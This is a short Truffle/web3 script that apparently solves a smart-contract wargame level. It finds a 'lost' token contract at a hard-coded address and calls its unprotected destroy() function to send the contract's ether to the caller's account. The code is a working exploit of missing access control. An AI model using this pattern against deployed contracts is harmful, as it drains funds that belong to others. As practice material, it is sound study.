const Recovery = artifacts.require("SimpleToken");
const web3 = Recovery.web3;
module.exports = async (callback) => {
  const accounts = await web3.eth.getAccounts();
  const account = accounts[0];
  try {
    const lostAddress = "0x1846f9C1c4C8Fc396C096a24F2E72f3C225Ac5f7"; // from etherscan
    let lostBalance = await web3.eth.getBalance(lostAddress);
    console.log("Lost balance:", web3.utils.fromWei(lostBalance, "ether"));
    const lostToken = await Recovery.at(lostAddress);
    console.log("Destroying lost token...");
    await lostToken.destroy(account);
    lostBalance = await web3.eth.getBalance(lostAddress);
    console.log("Lost balance:", web3.utils.fromWei(lostBalance, "ether"));
  } catch (err) {
    console.log("Oops: ", err.message);
  }
  callback();
};
